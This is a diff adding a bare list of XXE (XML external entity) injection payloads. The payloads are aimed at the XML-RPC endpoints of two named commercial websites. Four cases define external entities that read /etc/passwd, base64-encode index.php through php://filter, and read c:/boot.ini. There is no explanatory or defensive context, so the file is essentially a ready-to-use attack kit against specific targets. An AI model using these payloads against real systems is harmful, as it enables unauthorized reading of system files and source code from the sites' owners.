@@ -1,0 +1,38 @@
+http://www.polkmarine.com/api/xmlrpc
+
+case 1
+===============================================================
+<!DOCTYPE a
+[<!ENTITY BBHH "Hacked or what ever text">]
+>
+<methodCall><methodName>&BBHH;</methodName></methodCall>
+
+
+
+===============================================================
+
+case 2
+===============================================================
+<!DOCTYPE a
+[<!ENTITY BBHH SYSTEM "file:///etc/passwd">]
+>
+<methodCall><methodName>&BBHH;</methodName></methodCall>
+
+===============================================================
+
+case 3
+===============================================================
+<!DOCTYPE xxevul
+[<!ENTITY BBHH SYSTEM "php://filter/convert.base64-encode/resource=index.php">]
+>
+<methodCall><methodName>&BBHH;</methodName></methodCall>
+
+===============================================================
+
+ <!DOCTYPE foo [  
+   <!ELEMENT foo ANY >
+   <!ENTITY BBHH SYSTEM "file:///c:/boot.ini" >]>
+   <methodCall><methodName>&BBHH;</methodName></methodCall>
+
+SOAP
+https://www.audimas.com/api/xmlrpc
